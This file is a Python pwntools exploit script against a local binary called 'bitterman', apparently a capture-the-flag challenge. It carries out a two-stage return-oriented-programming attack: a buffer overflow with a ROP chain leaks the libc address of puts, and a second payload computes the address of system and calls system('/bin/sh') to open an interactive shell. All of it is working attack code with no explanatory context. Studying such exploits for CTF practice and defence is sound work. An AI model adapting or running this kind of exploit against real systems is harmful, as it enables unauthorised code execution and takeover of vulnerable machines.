from pwn import *

p = process('./bitterman')

context(os='linux', arch='amd64')
context.log_level = 'info'

#  400520:	ff 25 2a 07 20 00    	jmpq   *0x20072a(%rip)        # 600c50 <puts@GLIBC_2.2.5>

#stage 1
plt_main = p64(0x4006ec)
plt_put  = p64(0x400520)
got_put  = p64(0x600c50)
pop_rdi  = p64(0x400853)
junk     = "A"*152

payload = junk + pop_rdi + got_put + plt_put + plt_main

#> What's your name? 
#sp00ks7
#Hi, sp00ks7
#
#> Please input the length of your message: 
#2014
#> Please enter your text: 
#payload goes here!
#> Thanks!

p.recvuntil("name?")
p.sendline("spooks7")
p.recvuntil("message:")
p.sendline("1024")
p.recvuntil("text:")
p.sendline(payload)
p.recvuntil("Thanks!")

leaked_puts = p.recv()[:8].strip().ljust(8, '\x00')
log.success("Leaked puts@GLIBC " + str(leaked_puts))
leaked_puts = u64(leaked_puts)

#stage 2
libc_put = (0x071910)
libc_sys = (0x0449c0)
libc_sh  = (0x181519)
offset   = leaked_puts - libc_put
sys      = p64(offset + libc_sys)
sh       = p64(offset + libc_sh)

payload  = junk + pop_rdi + sh + sys 

#p.recvuntil("name?")
p.sendline("spooks7")
p.recvuntil("message:")
p.sendline("1024")
p.recvuntil("text:")
p.sendline(payload)
p.interactive()










